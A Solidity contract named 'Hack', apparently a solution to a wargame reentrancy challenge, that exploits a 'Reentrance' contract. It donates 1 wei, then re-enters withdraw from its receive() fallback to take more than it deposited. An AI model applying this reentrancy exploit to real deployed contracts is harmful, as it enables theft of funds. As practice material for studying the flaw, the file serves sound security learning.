pragma solidity 0.6.12;

interface Reentrance {
    function donate(address) external  payable;
    function balanceOf(address ) external  view returns (uint256);
    function withdraw(uint256 ) external ;
}
contract Hack{
    bool hacked=false;
    Reentrance target;
    constructor(address add) public payable {
        target  = Reentrance(add);
        }
    function solve() public payable {
        address to = address(this);
        // uint256 amount = target.balanceOf(to);
        // require(amount==0);
        target.donate.value(1)(to);
        target.withdraw(1);
    }
    function withdraw(uint amount) public {
        target.withdraw(amount);
        msg.sender.send(address(this).balance);
    }

    receive() external payable {
        if (hacked==false) {
        target.withdraw(1);
        hacked=true;
        }
     }

}